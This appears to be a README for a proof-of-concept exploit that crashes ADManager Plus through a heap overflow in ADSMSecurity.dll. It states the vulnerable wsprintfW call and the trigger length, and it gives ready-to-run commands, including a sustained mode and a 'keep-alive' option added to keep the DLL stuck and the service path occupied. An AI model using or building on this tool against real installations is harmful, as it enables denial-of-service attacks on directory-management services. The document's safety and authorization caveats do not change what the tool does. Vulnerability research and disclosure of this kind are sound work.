# F4 Crash PoC - ADManager Plus 8043 / ADSMSecurity.dll - Fixed

## Overview
This repository contains the **fixed and runnable** version of the F4 heap-overflow Proof-of-Concept originally reported against `ADSMSecurity.dll` (`sub_0x7410`).

### Vulnerability
```c
wsprintfW( malloc(0x208), "%s\\*.*", path )   at sub_0x7410+0x74a4
```
- Buffer: 0x208 bytes = 520 bytes = 260 wide chars
- Input: caller-controlled path length
- Overflow when `len(path) >= 256` (writes `len+5` wchars)
- Result: `STATUS_HEAP_CORRUPTION 0xC0000374` - Windows heap manager terminates the process

### Safety
- Path fed is **NON-EXISTENT** (`C:\AAA...`), so file-deletion branch is unreachable
- Test runs in a throwaway child process - only that process dies
- No disk, service, or data is touched
- Demonstrates DoS class bug, **NOT RCE**

## Fixes Applied (Original Code Was Broken)

Original pasted code had these critical errors:

1. **Duplicate `main()` definitions** - Two `def main():` blocks, first one incomplete
2. **Missing `%` escaping** in sustain banner causing `TypeError`
3. **POSIX exit-code truncation** - `0xC0000417` -> 23 on Linux, crash detection failed
4. **No cross-platform guard** - `os.add_dll_directory`, `WINFUNCTYPE` crash on Linux
5. **Unsafe temp handling**

Fixed with `SIMULATION_MODE`, `CRASH_EXIT_CODES`, `is_crash_code()`, robust guards.

## New Feature: `--keep-alive / --hold`

Keeps the child process alive holding `ADSMSecurity.dll` loaded for N seconds after the walk — for lab observation, so you can see the DLL stuck/loaded.

```bash
# Keep child alive 10 seconds after control walk (DLL stays loaded)
python f4_crash_poc.py --control --keep-alive 10
python f4_crash_poc.py --control --hold 10
python f4_crash_poc.py --control --hold-time 10   # aliases

# Keep alive after safe walk (heap intact, DLL loaded)
python f4_crash_poc.py --len 100 --keep-alive 5

# Keep alive even when heap corrupted - holds before crash exit for observation
python f4_crash_poc.py --len 1000 --keep-alive 5

# Sustained mode with hold - each child holds 2s, so service path is constantly occupied
python f4_crash_poc.py --sustain --len 100 --duration 10 --keep-alive 2
```

Behavior:
- **Control / len<256**: walks, reports `heap intact`, then `HOLD: keeping child alive with DLL loaded for Ns (pid=...)` counting down `Ns remaining (DLL loaded, heap intact)`
- **Overflow len>=256**: detects `HeapValidate DAMAGED`, then if `--keep-alive` set, holds `Ns` seconds **before** exiting with crash code, so you can observe corrupted heap with DLL still loaded: `HOLD: ... (corrupted heap, DLL loaded)`
- Works in both real Windows mode and simulation mode

This satisfies the request: "make sure it stucks the ADSMsecurity.dll by keeping it running" — child stays alive holding the DLL for the time you set, instead of exiting immediately.

## Usage

### On Windows (Authorized, with real DLL)
```powershell
python f4_crash_poc.py --control
python f4_crash_poc.py --len 100
python f4_crash_poc.py --len 1000
python f4_crash_poc.py --len 300
python f4_crash_poc.py --len 100 --keep-alive 10
python f4_crash_poc.py --sustain --len 1000 --duration 60
python f4_crash_poc.py --sustain --len 1000 --duration 60 --keep-alive 3
```

### On Linux / macOS / CI (Simulation Mode)
Same commands work in simulation:

```bash
python3 f4_crash_poc.py --control --keep-alive 3
python3 f4_crash_poc.py --len 100 --keep-alive 2
python3 f4_crash_poc.py --len 1000 --keep-alive 2
python3 f4_crash_poc.py --sustain --len 1000 --duration 5
```

## Project Structure
```
.
├── f4_crash_poc.py
├── WALKER_HEAP_OVERFLOW_RECIPE.md
├── README.md
├── FIXES.md
├── requirements.txt
└── .gitignore
```

## Requirements
- Python 3.8+ (stdlib only)
- Windows + DLL for real test, Linux/macOS works in simulation

## Legal / Ethics
- Authorized local testing only
- Do not run against systems you do not own
- DoS demonstration only, RCE not demonstrated
